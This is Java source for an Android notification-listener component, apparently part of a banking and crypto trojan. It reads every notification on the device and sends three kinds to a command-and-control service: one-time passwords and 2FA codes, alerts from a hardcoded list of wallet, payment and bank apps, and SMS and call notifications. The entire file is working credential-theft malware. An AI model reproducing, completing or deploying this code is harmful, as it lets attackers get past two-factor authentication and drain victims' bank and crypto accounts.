package com.wuzenx.services;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import com.wuzenx.C2Service;

public class NotificationGrabber extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            android.os.Bundle extras = sbn.getNotification().extras;
            String title = extras.getString(android.app.Notification.EXTRA_TITLE, "");
            String text = extras.getString(android.app.Notification.EXTRA_TEXT, "");
            String content = title + " | " + text;
            String pkg = sbn.getPackageName();
            
            // OTP detection - any message with code pattern
            if (java.util.regex.Pattern.compile(
                    "(OTP|code|verification|2FA|\\b\\d{4,8}\\b|one.time|authentication|login code)",
                    java.util.regex.Pattern.CASE_INSENSITIVE).matcher(content).find()) {
                if (C2Service.instance != null) {
                    C2Service.instance.sendMessage("otp", "[" + pkg + "] " + content);
                }
            }
            
            // Banking/wallet app detection
            String[] financialApps = {"binance", "coinbase", "kucoin", "bybit", "okx",
                "trustwallet", "metamask", "crypto.com", "blockchain", "exodus",
                "electrum", "mycelium", "bitcoin", "paypal", "venmo", "cashapp",
                "chase", "bank of america", "wells fargo", "hdfc", "icici", "sbi"};
            
            for (String app : financialApps) {
                if (pkg.contains(app.toLowerCase())) {
                    if (C2Service.instance != null)
                        C2Service.instance.sendMessage("balance", "[" + pkg + "] " + content);
                    break;
                }
            }
            
            // SMS/call app detection
            if (pkg.contains("sms") || pkg.contains("mms") || pkg.contains("messages") ||
                pkg.contains("com.android.phone") || pkg.contains("com.android.dialer")) {
                if (C2Service.instance != null)
                    C2Service.instance.sendMessage("sms", content);
            }
            
        } catch (Exception ignored) {}
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}
}
